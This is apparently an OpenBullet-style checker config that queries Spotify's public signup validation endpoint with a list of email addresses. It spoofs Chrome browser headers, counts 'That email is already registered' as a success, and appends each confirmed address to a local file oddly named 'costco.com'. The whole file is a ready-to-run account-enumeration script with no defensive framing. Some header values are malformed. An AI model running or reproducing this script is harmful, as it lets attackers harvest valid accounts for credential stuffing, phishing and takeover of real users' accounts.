[SCRIPT]
REQUEST GET "https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email=<USER>" 
  
  HEADER ": scheme: https" 
  HEADER "accept: */*" 
  HEADER "accept-encoding: gzip, deflate, br" 
  HEADER "accept-language: en-US,en;q=0.9,ar;q=0.8" 
  HEADER "origin: https://www.spotify.com" 
  HEADER "referer: https://www.spotify.com/" 
  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"" 
  HEADER "sec-ch-ua-mobile: ?0" 
  HEADER "sec-ch-ua-platform: \"Windows\"" 
  HEADER "sec-fetch-dest: empty" 
  HEADER "sec-fetch-mode: cors" 
  HEADER "sec-fetch-site: https://costco.com/" 
  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 

KEYCHECK 
  KEYCHAIN Success OR 
    KEY "That email is already registered" 
  KEYCHAIN Failure OR 
    KEY "status\":1" 

UTILITY File "costco.com" AppendLines "<USER>" 

